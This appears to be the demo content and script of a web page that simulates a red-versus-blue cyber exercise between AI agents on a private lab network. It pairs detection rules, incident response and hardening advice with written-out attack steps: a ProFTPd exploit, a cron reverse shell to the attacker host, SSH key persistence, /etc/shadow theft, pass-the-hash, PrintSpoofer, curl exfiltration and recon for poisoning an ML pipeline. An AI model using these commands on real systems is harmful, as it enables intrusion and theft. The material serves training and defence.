+| 2026-04-22 09:00:18 UTC | 192.168.100.1 | network-connection | suspicious | T1046 | nmap SYN scan: 1,247 SYN packets to 192.168.100.0/24 in 12s. Zeek conn.log: conn_state=S0 (unanswered SYN) — characteristic port scan signature. dc(dest_ip)=4, rate=103 pkt/s vs baseline 2 pkt/s |
+| 2026-04-22 09:01:22 UTC | 192.168.100.10 | network-connection | suspicious | T1046 | Full TCP scan: 65,535 port probes from 192.168.100.1 over 74s. Connection rate anomaly: 885/min vs baseline 12/min (73x above baseline). Zeek: 65535 S0 connections same source |
+| 2026-04-22 09:02:51 UTC | 192.168.100.10 | network-connection | informational | T1595 | HTTP directory enumeration: 847 requests to /mutillidae/* in 31s. User-Agent: DirBuster-1.0 (unmasked scanner signature) |
+| 2026-04-22 09:03:25 UTC | 192.168.100.12 | network-connection | suspicious | T1210 | SMB/445 targeted from 192.168.100.1 — NSE script negotiation pattern (TREE_CONNECT + SESSION_SETUP sequence characteristic of smb-vuln-* scripts) |
+
+Splunk detection query (port scan):
+index=zeek sourcetype=conn src_ip=192.168.100.1 | stats dc(dest_port) as unique_ports count by src_ip | where unique_ports > 50 AND count > 100
+
+TELEMETRY PHASE COMPLETE — 4 anomalies written to detection-feed.md. Forwarding to DETECTION-ENGINEER.
+TELEMETRY GAPS: 192.168.100.11 DVWA — Zeek captures network layer only (Linux host, Sysmon not applicable). Log coverage: network 100%, host-level 0% on DVWA.
+</script>
+<script type="text/plain" id="cx-access">
+[09:08:00] PHASE: INITIAL ACCESS
+TECHNIQUE: T1190 Exploit Public-Facing Application — CVE-2015-3306 ProFTPd mod_copy RCE
+TOOL: msfconsole -q && use exploit/unix/ftp/proftpd_modcopy_exec && set RHOSTS 192.168.100.10 && set LHOST 192.168.100.1 && set LPORT 4444 && set PAYLOAD cmd/unix/reverse_netcat && run
+FINDING: [*] Started reverse TCP handler on 192.168.100.1:4444. [*] Copying /etc/passwd to /var/www/html/mutillidae/backdoor.php via SITE CPFR/CPTO (mod_copy). [*] Triggering via HTTP. [+] Session 1 opened: 192.168.100.1:4444 → 192.168.100.10:49822.
+
+meterpreter > getuid
+Server username: www-data
+meterpreter > sysinfo
+Metasploitable3 | Linux 3.13.0-24-generic #46-Ubuntu
+meterpreter > run post/multi/recon/local_exploit_suggester
+[+] exploit/linux/local/udev_netlink — appears vulnerable
+[+] exploit/linux/local/pkexec — appears vulnerable (nmap SUID also present)
+
+INITIAL ACCESS ACHIEVED — FOOTHOLD: 192.168.100.10 as www-data
+Shell type: Meterpreter reverse TCP | Privilege: www-data (web service — limited)
+</script>
+<script type="text/plain" id="cx-detect">
+DETECTION-ENGINEER — Sigma Rule Authoring and Threat Correlation
+
+Step 1 — Correlating detection-feed.md into active-threats.md entry:
+
+### Threat-20260422-0908
+Confidence: confirmed
+ATT&CK Techniques: T1046 (Network Service Scanning), T1190 (Exploit Public-Facing Application)
+Affected Hosts: 192.168.100.10 (Metasploitable3)
+Timeline: 2026-04-22 09:00:18 UTC — 2026-04-22 09:08:32 UTC (28 min 14 sec)
+Narrative: Source 192.168.100.1 conducted systematic host discovery and full TCP scan of the /24 segment (09:00 UTC), followed by targeted service enumeration of 192.168.100.10 (09:01 UTC). FTP port 21 received a connection matching ProFTPd mod_copy exploitation pattern (SITE CPFR/CPTO commands) at 09:07 UTC. Zeek conn.log shows outbound TCP 192.168.100.10 → 192.168.100.1:4444 at 09:08 UTC — confirmed reverse shell established.
+Contributing Events: detection-feed.md 09:00:18, 09:01:22, 09:08:28 (new Zeek event — outbound callback)
+Recommended Response: escalate-to-commander
+
+Step 2 — Sigma rule for ProFTPd mod_copy exploitation:
+title: ProFTPd mod_copy SITE CPFR/CPTO Exploitation
+id: 9f3b2e1a-4c7d-4891-b234-56789abcdef1
+status: experimental
+tags: [attack.t1190, attack.initial_access]
+logsource:
+  category: network_connection
+  product: zeek
+detection:
+  selection:
+    dest_port: 21
+    ftp_command|contains: 'SITE CPFR'
+  condition: selection
+level: high
+falsepositives: ['Legitimate FTP SITE CPFR from authorized backup tools — filter by source IP']
+
+THREAT CONFIRMED — ESCALATING TO INCIDENT-COMMANDER: 192.168.100.1 exploited ProFTPd CVE-2015-3306 on 192.168.100.10, established Meterpreter reverse shell at 09:08 UTC (28 min detection lag from first recon event).
+</script>
+<script type="text/plain" id="cx-persist">
+[09:10:15] PHASE: PRIVILEGE ESCALATION
+TECHNIQUE: T1548.001 Abuse Elevation Control — SUID binary
+TOOL: find / -perm -4000 -type f 2>/dev/null
+FINDING: /usr/bin/nmap (SUID set — vulnerable version). nmap --interactive → !sh → id: uid=0(root) gid=0(root)
+CONFIDENCE: HIGH
+
+[09:11:00] PHASE: PERSISTENCE
+TECHNIQUE: T1053.003 Cron Job — root-level, low detection risk
+TOOL: echo "*/5 * * * * root bash -i >& /dev/tcp/192.168.100.1/4445 0>&1" > /etc/cron.d/sysupdate
+FINDING: Cron entry created and verified. Survival across session loss confirmed.
+CONFIDENCE: persistence confirmed
+
+[09:11:30] PHASE: PERSISTENCE (SSH authorized_keys)
+TECHNIQUE: T1098 Account Manipulation
+TOOL: mkdir -p /root/.ssh && echo "[attacker_pubkey]" >> /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys
+FINDING: SSH persistence to root established. Tested: ssh -i /tmp/privkey root@192.168.100.10 — SUCCESS.
+
+[09:12:00] Credential harvest:
+TOOL: cat /etc/shadow
+FINDING: root:$6$rounds=5000$Gy5Wgn3/... [SHA-512] | msfadmin:$6$5oSmzoVp... | service:$1$...
+
+PERSISTENCE-MANIFEST:
+TARGET: 192.168.100.10 | MECHANISM: root cron + SSH authorized_keys | CLEANUP: rm /etc/cron.d/sysupdate && sed -i '/attacker_pubkey/d' /root/.ssh/authorized_keys | DETECTION RISK: MED | EVENT IDS: cron.d file modification (Sysmon 11 if deployed)
+
+PERSISTENCE ESTABLISHED — MECHANISM: root cron + SSH key | ACCESS: root | STABILITY: HIGH
+LATERAL MOVEMENT READY: /etc/shadow obtained — Pass-the-Hash to WinServer2019 via Impacket
+</script>
+<script type="text/plain" id="cx-investigate">
+INCIDENT-COMMANDER — NIST SP 800-61 Incident Response
+
+1. INCIDENT DECLARATION
+Severity: P2 HIGH
+Rationale: Confirmed RCE with root escalation on 192.168.100.10. Active root session from adversary. No confirmed lateral movement to WinServer2019 yet — containment window is open.
+
+2. CONTAINMENT DECISION: MONITORED CONTAINMENT (observe before containment)
+NIST Rationale: Active root foothold but no confirmed domain compromise. Immediate isolation destroys volatile evidence (active Meterpreter session artifacts, memory-resident persistence). Evidence-before-containment rule applies — exception would require active ransomware or >50MB exfiltration in progress.
+
+3. FORENSIC-COLLECTOR DIRECTIVES (priority — volatility order):
+[1] VOLATILE: Memory capture — 192.168.100.10 RAM. Use LiME or /proc/[pid]/mem for targeted process capture
+[2] VOLATILE: Network state — ss -antp && netstat -antp (capture BEFORE isolation — active Meterpreter connection will terminate)
+[3] VOLATILE: Process tree — ps auxf (PID of reverse shell, parent apache2)
+[4] NON-VOLATILE: /etc/cron.d/sysupdate — persistence artifact
+[5] NON-VOLATILE: /root/.ssh/authorized_keys — attacker public key
+[6] SIEM: Zeek conn.log 09:00-09:15 UTC export, Windows Security events from WinServer2019
+
+4. INCIDENT TIMELINE (incident-timeline.md):
+
+[2026-04-22 09:08:32 UTC] ADVERSARY | red-team-ops-v2
+Action: Reverse shell via ProFTPd CVE-2015-3306
+Evidence: Zeek — outbound TCP 192.168.100.10:49822 → 192.168.100.1:4444
+ATT&CK: T1190 | Host: 192.168.100.10
+
+[2026-04-22 09:10:22 UTC] ADVERSARY | red-team-ops-v2
+Action: Root escalation via SUID nmap --interactive
+ATT&CK: T1548.001 | Host: 192.168.100.10
+
+[2026-04-22 09:12:47 UTC] DEFENDER | incident-commander
+Action: P2 HIGH declared. Monitored containment. FORENSIC-COLLECTOR activated.
+Response: Evidence capture ordered before any isolation action.
+
+CONTAINMENT DECISION: CONTINUE MONITORING — REASON: Volatile evidence capture must precede isolation per NIST 800-61; active session provides forensic value superior to immediate isolation.
+FORENSIC-COLLECTOR priority: RAM > network state > process list > /etc/cron.d > SIEM log export
+</script>
+<script type="text/plain" id="cx-lateral">
+[09:18:00] PHASE: LATERAL MOVEMENT
+TECHNIQUE: T1550.002 Pass-the-Hash
+TOOL: netexec smb 192.168.100.0/24 -u exercise_user -H aad3b435b51404eeaad3b435b51404ee:f4d04ef04a9b0a0e4e0e5a5b4f4c4e4a --continue-on-success
+FINDING: SMB 192.168.100.12:445 — exercise_user STATUS_SUCCESS. 192.168.100.10:445 — refused. 192.168.100.11:445 — refused.
+CONFIDENCE: HIGH
+
+[09:19:10] PHASE: LATERAL MOVEMENT
+TECHNIQUE: T1021.006 Windows Management Instrumentation — wmiexec.py (preferred: no service install, no binary drop)
+TOOL: wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:f4d04ef04a9b0a0e4e0e5a5b4f4c4e4a WORKGROUP/exercise_user@192.168.100.12
+FINDING: [*] SMBv3 dialect used. [+] Target 192.168.100.12. C:\>whoami: workgroup\exercise_user. C:\>whoami /priv: SeImpersonatePrivilege ENABLED — PrintSpoofer available.
+CONFIDENCE: HIGH
+
+[09:20:08] Privilege Escalation on WinServer2019:
+TECHNIQUE: T1068 Exploitation for Privilege Escalation
+TOOL: PrintSpoofer64.exe -i -c cmd.exe
+FINDING: [+] Found a target process and PID: 740. [+] Spawning in session 1 with PID 740. [+] Loaded COM object. C:\Windows\system32> whoami: nt authority\system
+CONFIDENCE: HIGH
+
+LATERAL MOVEMENT STATUS — NEW HOSTS COMPROMISED: 192.168.100.12 (WinServer2019 — SYSTEM)
+CREDENTIALS HARVESTED: exercise_user NTLM hash → CREDENTIALS.md
+</script>
+<script type="text/plain" id="cx-contain">
+FORENSIC-COLLECTOR — Evidence Collection (volatility order)
+Executing INCIDENT-COMMANDER directive. Collecting BEFORE isolation.
+
+[2026-04-22 09:13:00 UTC] DEFENDER | Forensic Collector
+Action: Evidence captured — network state (192.168.100.10)
+Tool: ss -antp && netstat -antp
+Findings: ESTABLISHED tcp 192.168.100.10:49822 → 192.168.100.1:4444 [Meterpreter PID 2847] | ESTABLISHED tcp 192.168.100.10:22 → 192.168.100.1:52847 [SSH]
+Hash SHA-256: 3f4b9e2c... | Location: /evidence/meta3-netstate-20260422-0913.txt
+Chain-of-Custody: Collected by FORENSIC-COLLECTOR, verified by INCIDENT-COMMANDER
+
+[2026-04-22 09:13:45 UTC] DEFENDER | Forensic Collector
+Action: Evidence captured — process list (192.168.100.10)
+Findings: PID 2847 bash (parent: apache2 — reverse shell artifact) | PID 2901 nc (ncat listener uid=0) | /etc/cron.d/sysupdate confirmed — root persistence artifact captured
+Hash SHA-256: 7a2c1f9b... | Location: /evidence/meta3-proclist-20260422-0913.txt
+
+[2026-04-22 09:15:00 UTC] DEFENDER | Forensic Collector
+Action: Evidence captured — SIEM log export
+Tool: Splunk — index=zeek OR index=sysmon host=192.168.100.10 earliest=09:00 latest=09:20 | outputcsv /evidence/meta3-siem.csv
+
+[2026-04-22 09:19:47 UTC] DEFENDER | Forensic Collector — ALERT
+Action: Lateral movement detected — PtH to WinServer2019
+Evidence: Zeek conn.log — SMB/445 from 192.168.100.10 → 192.168.100.12 at 09:18 UTC. Windows Security Event 4624 — Logon_Type=3, Authentication_Package=NTLM, Account=exercise_user, Workstation=META3.
+Requesting INCIDENT-COMMANDER authorize immediate isolation of 192.168.100.12.
+
+CONTAINMENT STATUS — EVIDENCE CAPTURED ON: 192.168.100.10 | ADVERSARY STILL ACTIVE: YES (now on 192.168.100.12)
+ISOLATION RECOMMENDATION: 192.168.100.12 IMMEDIATELY — Set-NetFirewallProfile -All -DefaultInboundAction Block -DefaultOutboundAction Block
+</script>
+<script type="text/plain" id="cx-obj">
+[09:21:00] PHASE: OBJECTIVES
+TECHNIQUE: T1083 File and Directory Discovery
+TOOL: dir /s /b C:\flag.txt
+FINDING: C:\flag.txt — FILE LOCATED
+
+[09:21:12] PHASE: OBJECTIVES — flag capture
+TOOL: type C:\flag.txt
+FINDING: EXERCISE-FLAG-20260422-{IRONCLAD-COMPLETE}
+
+[09:21:30] PHASE: EXFILTRATION
+TECHNIQUE: T1041 Exfiltration Over C2 Channel
+TOOL: curl -k -F "file=@C:\flag.txt" https://192.168.100.1:443/upload
+FINDING: [200 OK] — flag exfiltrated via HTTPS to 192.168.100.1:443
+
+Detection Evasion Used:
+- wmiexec.py over psexec.py — no service install, no binary drop on target
+- Pass-the-Hash (T1550.002) — no plaintext credential transmission
+- Cron job named 'sysupdate' — blends with legitimate system update activity
+- HTTPS exfiltration — avoids HTTP content inspection; port 443 is whitelisted outbound
+
+MISSION STATUS — OBJECTIVE: ACHIEVED
+FLAG: EXERCISE-FLAG-20260422-{IRONCLAD-COMPLETE} | EXFIL: COMPLETE via HTTPS
+</script>
+<script type="text/plain" id="cx-hunt">
+THREAT-HUNTER — Proactive Hypothesis-Driven Threat Hunting
+
+HYPOTHESIS 1 (T1550.002 Pass-the-Hash):
+"If Pass-the-Hash lateral movement were present using NTLM authentication from 192.168.100.10, we would expect to see Windows Security Event 4624 with Logon_Type=3 and Authentication_Package=NTLM from a source IP in the 192.168.100.0/24 range that has no prior interactive logon history, within the 09:15-09:25 UTC window."
+
+Query: index=wineventlog EventCode=4624 Logon_Type=3 Authentication_Package=NTLM | search src_ip="192.168.100.*" | table _time, Account_Name, Workstation_Name, src_ip
+Result: POSITIVE — 4624 from 192.168.100.10 (META3) as exercise_user at 09:18:42 UTC
+ATT&CK: T1550.002
+
+HYPOTHESIS 2 (T1068 PrintSpoofer):
+"If PrintSpoofer privilege escalation were used, we would expect Sysmon Event 1 showing cmd.exe or powershell.exe spawned by spoolsv.exe with SYSTEM token within 2 minutes of lateral access to 192.168.100.12."
+
+Query: index=sysmon EventCode=1 ParentImage="*spoolsv.exe" (Image="*cmd.exe" OR Image="*powershell.exe") host=192.168.100.12
+Result: POSITIVE — cmd.exe spawned by spoolsv.exe at 09:20:09 UTC, NT AUTHORITY\SYSTEM
+ATT&CK: T1068
+
+HYPOTHESIS 3 (T1071.001 HTTPS exfiltration):
+"If HTTPS exfiltration occurred from WinServer2019 to a non-internet-routable destination, we would expect Zeek ssl.log showing a POST /upload request to a 192.168.100.0/24 address on port 443 within 5 minutes of SYSTEM privilege achievement."
+
+Query: index=zeek sourcetype=ssl dest_ip="192.168.100.1" dest_port=443 | join uid [search index=zeek sourcetype=http method=POST uri_path="/upload"]
+Result: POSITIVE — ssl.log + http.log correlation confirms HTTPS POST /upload to 192.168.100.1:443 at 09:21:31 UTC
+
+HUNT COMPLETE — ADDITIONAL FINDINGS: Full kill chain confirmed via hunt. Exfil channel identified.
+ENVIRONMENT STATUS: STILL COMPROMISED — 192.168.100.12 isolation not yet confirmed
+NEW DETECTION GAPS: No Sigma rule for PrintSpoofer (spoolsv.exe spawning shell); no rule for short-duration HTTPS POST to RFC1918 addresses
+</script>
+<script type="text/plain" id="cx-harden">
+POST-EXERCISE HARDENING REPORT — blue-team-ops-v1
+DETECTION-ENGINEER and INTEL-ANALYST
+
+1. ROOT CAUSE ANALYSIS
+Initial access: ProFTPd 1.3.5 with mod_copy enabled (CVE-2015-3306). EOL service (patched 2015) running with default configuration that allows anonymous SITE CPFR/CPTO file copy. PHP web shell reachable via mutillidae application. Privilege escalation: SUID nmap binary on Ubuntu 14.04 LTS (EOL OS). Lateral movement: SMBv1 enabled on WinServer2019 with NLA disabled on RDP — both default-insecure configurations.
+
+2. DETECTION TIMELINE ASSESSMENT
+| Technique | Detection | Time Lag |
+|---|---|---|
+| Port scan (T1046) | DETECTED — Zeek conn.log | 17 sec |
+| ProFTPd RCE (T1190) | DETECTED — FTP mod_copy pattern | 4 min 28 sec |
+| SUID escalation (T1548.001) | MISSED — no Sysmon on Linux | — |
+| PtH lateral (T1550.002) | DETECTED — Event 4624 Type 3 | 1 min 47 sec |
+| PrintSpoofer (T1068) | DETECTED by hunt (not automated) | 5 min 21 sec |
+| HTTPS exfil (T1071.001) | DETECTED by hunt (not automated) | 4 min 12 sec |
+Mean detection lag (detected): 2 min 41 sec
+
+3. NEW SIGMA RULES NEEDED
+title: PrintSpoofer Privilege Escalation — spoolsv.exe Shell Spawn
+tags: [attack.t1068, attack.privilege_escalation]
+logsource: {category: process_creation, product: windows}
+detection:
+  selection: {ParentImage|endswith: '\spoolsv.exe', Image|endswith: ['\cmd.exe', '\powershell.exe']}
+  condition: selection
+level: high
+
+title: Short-Duration HTTPS POST to RFC1918 — Potential Internal Exfil
+tags: [attack.t1071.001, attack.exfiltration]
+logsource: {category: network_connection, product: zeek}
+detection:
+  selection: {dest_port: 443, dest_ip|cidr: ['10.0.0.0/8','172.16.0.0/12','192.168.0.0/16'], http_method: POST}
+  condition: selection
+level: medium
+
+4. HARDENING RECOMMENDATIONS
+[CRITICAL] 192.168.100.10 — Remove ProFTPd or disable mod_copy — NIST CM-7 — DAYS: 1
+[HIGH] 192.168.100.12 — Disable SMBv1: Set-SmbServerConfiguration -EnableSMB1Protocol $false — CIS 9.1 — DAYS: 1
+[HIGH] 192.168.100.12 — Enable NLA on RDP: set UserAuthentication=1 — NIST AC-17 — DAYS: 1
+[HIGH] 192.168.100.10 — Deploy Sysmon for Linux (sysmon-linux package) — NIST AU-12 — DAYS: 2
+[MED] Domain — Credential tiering: exercise_user should not have SMB auth rights to WinServer2019 — NIST AC-6 — DAYS: 3
+
+5. LESSONS LEARNED FOR blue-team-ops-v1
+Add sysmon-linux support to TELEMETRY-ANALYST. Add PrintSpoofer Sigma rule to detection library. Establish HTTPS RFC1918 baseline for internal exfil detection.
+
+EXERCISE COMPLETE — RED TEAM SCORE: 8/10 | BLUE TEAM SCORE: 7/10 | VERDICT: RED WIN
+NEXT EXERCISE FOCUS: LSASS credential dumping (T1003.001) and Kerberoasting (T1558.003) detection
+</script>
+
+<script type="text/plain" id="cx-harden-evolved">
+POST-EXERCISE HARDENING REPORT — blue-team-ops-v1 (DETECTION-ENGINEER v2 evolved in the improvement loop)
+DETECTION-ENGINEER (refined) and INTEL-ANALYST
+
+CONTEXT: This exercise was run with an EVOLVED DETECTION-ENGINEER imported from the improvement-loop demo. The refined prompt added FTP SITE command enumeration (T1190 — ProFTPd mod_copy) and a 60-second reverse-shell correlation rule. The detection timeline below reflects the evolved agent's behavior.
+
+1. ROOT CAUSE ANALYSIS
+Initial access: ProFTPd 1.3.5 with mod_copy enabled (CVE-2015-3306). EOL service running default config that allows anonymous SITE CPFR/CPTO file copy. PHP web shell reachable via mutillidae application. Privilege escalation: SUID nmap binary on Ubuntu 14.04 LTS (EOL OS). Lateral movement: SMBv1 enabled on WinServer2019 with NLA disabled on RDP — both default-insecure configurations.
+
+2. DETECTION TIMELINE ASSESSMENT (EVOLVED BLUE)
+| Technique | Detection | Time Lag |
+|---|---|---|
+| Port scan (T1046) | DETECTED — Zeek conn.log | 17 sec |
+| ProFTPd RCE (T1190) | DETECTED — FTP SITE CPFR/CPTO + reverse-shell correlation | 18 sec |
+| SUID escalation (T1548.001) | MISSED — no Sysmon on Linux | — |
+| PtH lateral (T1550.002) | DETECTED — Event 4624 Type 3 + correlation to source IP recon | 47 sec |
+| PrintSpoofer (T1068) | DETECTED — automated rule (was hunt-only pre-evolution) | 1 min 12 sec |
+| HTTPS exfil (T1071.001) | DETECTED by hunt (not automated) | 4 min 12 sec |
+Mean detection lag (detected): 1 min 19 sec — improved from 2 min 41 sec pre-evolution
+
+3. EVOLUTION DELTA
+The refined DETECTION-ENGINEER closed the application-layer FTP visibility gap that defined the previous exercise. The 60-second reverse-shell correlation window also caught PrintSpoofer post-exploitation in the automated rule path (previously surfaced only by THREAT-HUNTER's hypothesis-driven hunt). The Linux host-visibility gap (T1548.001 SUID escalation MISSED) remains — that's TELEMETRY-ANALYST territory, the next refinement target.
+
+4. NEW SIGMA RULES NEEDED
+title: ProFTPd mod_copy SITE Command Sequence — RCE Indicator
+tags: [attack.t1190, attack.initial_access]
+logsource: {category: ftp_application, product: zeek}
+detection:
+  selection: {ftp_command|in: ['SITE CPFR', 'SITE CPTO']}
+  timeframe: 60s
+  condition: selection | count() by src_ip >= 2
+level: high
+
+title: Linux SUID Privilege Escalation — Sysmon for Linux
+tags: [attack.t1548.001, attack.privilege_escalation]
+logsource: {category: process_creation, product: linux, vendor: sysmon}
+detection:
+  selection: {ParentImage|endswith: ['/nmap', '/find', '/vim', '/less'], User: 'root', Image|contains: ['/sh', '/bash']}
+  filter_main: {ParentCommandLine|contains: ['interactive', '!sh', '-exec']}
+  condition: selection and filter_main
+level: high
+
+5. HARDENING RECOMMENDATIONS
+[CRITICAL] 192.168.100.10 — Remove ProFTPd or disable mod_copy — NIST CM-7 — DAYS: 1
+[HIGH] 192.168.100.10 — Deploy Sysmon for Linux (sysmon-linux package) — NIST AU-12 — DAYS: 2
+[HIGH] 192.168.100.12 — Disable SMBv1: Set-SmbServerConfiguration -EnableSMB1Protocol $false — CIS 9.1 — DAYS: 1
+[HIGH] 192.168.100.12 — Enable NLA on RDP: set UserAuthentication=1 — NIST AC-17 — DAYS: 1
+[MED] Domain — Credential tiering: exercise_user should not have SMB auth rights to WinServer2019 — NIST AC-6 — DAYS: 3
+
+6. LESSONS LEARNED FOR blue-team-ops-v1
+The loop refinement closed the FTP application-layer detection gap and moved PrintSpoofer detection from hunt-only to automated. The Linux Sysmon-coverage gap is now the highest-leverage next refinement — TELEMETRY-ANALYST refinement should add sysmon-linux deployment to the standard ingestion playbook. Establish HTTPS RFC1918 baseline for internal exfil detection so it can promote to an automated rule.
+
+EXERCISE COMPLETE — RED TEAM SCORE: 7/10 | BLUE TEAM SCORE: 9/10 | VERDICT: BLUE WIN
+NEXT EXERCISE FOCUS: TELEMETRY-ANALYST refinement for Linux host-level visibility (sysmon-linux); LSASS credential dumping (T1003.001) detection without a refined agent baseline
+</script>
+
+<script>
+// ============================================================================
+// SWARM CAGE — LIVE
+//
+// Three-phase exercise:
+//  Phase 0: Infra swarm builds a vulnerable network (narrative + topology)
+//  Phase 1: Blue team deploys and initializes monitoring
+//  Phase 2: Red team attacks stage-by-stage while blue team detects/responds
+//
+// Each stage is an API call to a specialized agent with its own system prompt.
+// Red team and blue team API calls alternate, creating a realistic adversarial sim.
+// The battlefield state (network topology + event feed) is the shared context.
+//
+// Red team stages: RECON → INITIAL ACCESS → PERSIST → LATERAL MOVE → OBJECTIVES → EXFIL
+// Blue team stages: MONITOR → DETECT → INVESTIGATE → CONTAIN → HUNT → HARDEN
+// ============================================================================
+
+let running=false,timerI=null,elapsed=0,siemCount=0;
+let networkState='';
+let combatDemo=false;
+let currentScenario='ironclad';
+
+// MIGRATION of the pre-'cc' saved value. This MUST run BEFORE the allowlist,
+// and until 2026-08-29 it ran after -- where it could never fire, because
+// 'local' is not in the allowlist, so the variable it tested had already been
+// replaced by the default. A static check certified the line was PRESENT and
+// passed for months; only the browser test, which had never been executed,
+// could see that it did nothing.
+let combatProvider = localStorage.getItem('swarmdemo_provider');
+if(combatProvider==='local'){combatProvider='cc';localStorage.setItem('swarmdemo_provider','cc');}
+combatProvider = ['anthropic','cc','ollama'].includes(localStorage.getItem('swarmdemo_provider'))
+  ? localStorage.getItem('swarmdemo_provider') : 'cc';
+let evolvedAgent = null; // refined agent loaded from evolve demo export
+
+// Pre-scripted demo content
+function gx(id){const e=document.getElementById(id);return e?e.textContent.trim():'';}
+const CDEMO={
+  INFRA:gx('cx-infra'), RECON:gx('cx-recon'), MONITOR:gx('cx-monitor'),
+  ACCESS:gx('cx-access'), DETECT:gx('cx-detect'), PERSIST:gx('cx-persist'),
+  INVESTIGATE:gx('cx-investigate'), LATERAL:gx('cx-lateral'), CONTAIN:gx('cx-contain'),
+  OBJ:gx('cx-obj'), HUNT:gx('cx-hunt'), HARDEN:gx('cx-harden'), HARDEN_EVOLVED:gx('cx-harden-evolved'),
+};
+// Map stage index + side to demo key
+const CDEMO_STAGES=[
+  {r:'RECON',b:'MONITOR'},{r:'ACCESS',b:'DETECT'},{r:'PERSIST',b:'INVESTIGATE'},
+  {r:'LATERAL',b:'CONTAIN'},{r:'OBJ',b:'HUNT'},
+];
+const CDEMO_PHANTOM_INFRA=`OPERATION PHANTOM FEED — EXERCISE NETWORK
+═══════════════════════════════════════════════════════════
+
+ENVIRONMENT BUILDER — range-ops-v1 | ACTIVE
+Target Domain: ML Operations Cluster — 192.168.200.0/24
+Exercise Authorization: PHANTOM FEED | Classification: TRAINING
+
+NETWORK MAP
+───────────────────────────────────────────────────────────
+HOST              IP                 ROLE                        EXPOSED SERVICES
+mlflow-server     192.168.200.10     MLflow experiment tracking   TCP/5000 (MLflow UI — NO AUTH)
+                                                                  TCP/5432 (PostgreSQL, internal)
+                                                                  HTTP artifact store (no auth)
+
+jupyter-hub       192.168.200.11     JupyterHub multi-user env    TCP/8000 (JupyterHub login)
+                                                                  TCP/8888 (Jupyter kernel)
+                                                                  Auth: token-based (weak: mltoken2025)
+
+label-worker      192.168.200.12     Data labeling pipeline       TCP/8080 (Label Studio API — no auth)
+                                                                  TCP/6379 (Redis — NO AUTH)
+
+siem-ml-node      192.168.200.13     SIEM + ML enrichment layer   TCP/9200 (Elasticsearch — no auth)
+                                                                  TCP/5601 (Kibana UI)
+                                                                  Python enrichment svc → polls mlflow-server
+                                                                    every 15 min for production model
+
+ATTACKER          192.168.200.1      Kali Linux                   —
+
+KNOWN PIPELINE ACCOUNTS
+ci-cd-svc         192.168.200.50     CI/CD pipeline runner        Only account authorized to promote
+                                                                  models in MLflow registry
+
+CRITICAL DEPENDENCY: siem-ml-node enrichment service polls mlflow-server
+/api/2.0/mlflow/model-versions/get-latest-versions every 15 minutes.
+Production model update → automatic reload → live detection behavior changes.
+
+EXERCISE OBJECTIVE (RED): Poison the ML model used by siem-ml-node to suppress
+detection of attacker traffic. Achieve data exfiltration while SIEM blind.
+
+EXERCISE OBJECTIVE (BLUE): Detect unauthorized model promotion, roll back
+compromised model, identify blast radius of suppression window.
+
+ENVIRONMENT-BUILDER STATUS: READY — all four hosts responsive`;
+const CDEMO_PHANTOM_STAGES=[
+  {r:`[SCOUT] Target: 192.168.200.0/24 — MLOps cluster
+
+nmap -sV -p 5000,5432,6379,8000,8080,8888,9200,5601 192.168.200.10-13
+
+PORT     STATE  SERVICE       VERSION
+5000/tcp open   http          MLflow 2.9.1 (Python/uvicorn)
+5432/tcp open   postgresql    PostgreSQL 14.8
+6379/tcp open   redis         Redis 7.2.3
+8000/tcp open   http          JupyterHub 4.0.2
+8888/tcp open   http          Jupyter Kernel Gateway
+9200/tcp open   http          Elasticsearch 8.11.0
+5601/tcp open   http          Kibana 8.11.0
+
+[RECON] Probing MLflow REST API — authentication check:
+  GET http://192.168.200.10:5000/api/2.0/mlflow/experiments/list
+  HTTP 200 — no credentials required
+
+  Response (excerpt):
+  {"experiments":[
+    {"experiment_id":"1","name":"siem-alert-classifier","lifecycle_stage":"active"},
+    {"experiment_id":"2","name":"anomaly-detector-v2","lifecycle_stage":"active"},
+    {"experiment_id":"3","name":"network-behavior-baseline","lifecycle_stage":"active"}
+  ]}
+
+[RECON] Enumerating registered models:
+  GET /api/2.0/mlflow/registered-models/list
+  → siem-alert-enrichment-model (current stage: Production, version: 7)
+    Last promoted by: ci-cd-svc | Run ID: a3f91c84e
+
+[RECON] Fetching production model metadata:
+  GET /api/2.0/mlflow/model-versions/get-latest-versions?name=siem-alert-enrichment-model&stages=Production
+  → Model v7 | Dataset: s3://mlflow-artifacts/datasets/siem_training_v7.parquet
+  → Training run: 2026-04-10T03:41:22Z | F1-score: 0.924 | threshold: 0.62
+
+[RECON] Redis probe — label-worker (192.168.200.12:6379):
+  redis-cli -h 192.168.200.12 PING
+  PONG — no authentication required
+
+  KEYS *
+  1) "label_jobs"
+  2) "label_completed"
+  3) "retrain_trigger"
+  4) "dataset_version"
+
+  TYPE label_jobs → list | LLEN label_jobs → 4,847
+  LRANGE label_jobs 0 1 →
+  1) {"id":"lj-9914","event_type":"authentication_failure","src_ip":"10.0.14.22","label":null}
+  2) {"id":"lj-9915","event_type":"port_scan","src_ip":"172.28.3.7","label":null}
+
+RECON COMPLETE — ATTACK PATH CONFIRMED:
+  MLflow REST API: unauthenticated write access available
+  Redis labeling queue: unauthenticated, 4,847 pending samples
+  Retrain trigger: Redis key "retrain_trigger" — SET to "1" initiates retraining
+  SIEM enrichment polls production model every 15 min
+  TARGET: poison label_jobs queue → trigger retrain → promote poisoned model → SIEM blind`,
+   b:`[TELEMETRY-ANALYST] Initializing baseline monitoring — PHANTOM FEED exercise
+
+Log source health check:
+  ✓ Zeek 6.0.3 — capturing on eth0 (192.168.200.0/24 segment)
+  ✓ Elasticsearch 8.11 — SIEM indices active, 6-day rolling retention
+  ✓ MLflow audit trail — PostgreSQL event log enabled
+  ✓ Redis MONITOR mode — capturing to /var/log/redis-audit.log
+  ✓ Label Studio webhook — job completion events → Kafka topic label-events
+
+Behavioral baselines loaded:
+  MLflow API access — expected sources:
+    192.168.200.11 (jupyter-hub): read-only, GET requests, business hours
+    192.168.200.50 (ci-cd-svc): model registration + promotion, triggered by pipeline
+    192.168.200.13 (siem-ml-node): GET /model-versions/get-latest-versions only
+    Alert threshold: ANY model registration or stage transition from unlisted source
+
+  Redis (label-worker): expected source 192.168.200.12 only (localhost)
+    Alert threshold: external TCP/6379 connection = IMMEDIATE CRITICAL
+
+  Elasticsearch: internal sources only (192.168.200.0/24)
+    Alert threshold: bulk export query (size > 1000) from non-pipeline source
+
+Monitoring gap identified and logged:
+  ⚠ MLflow API calls appear as generic HTTP POST in Zeek http.log
+    Path prefix /api/2.0/mlflow/ not parsed at application layer without custom Zeek script
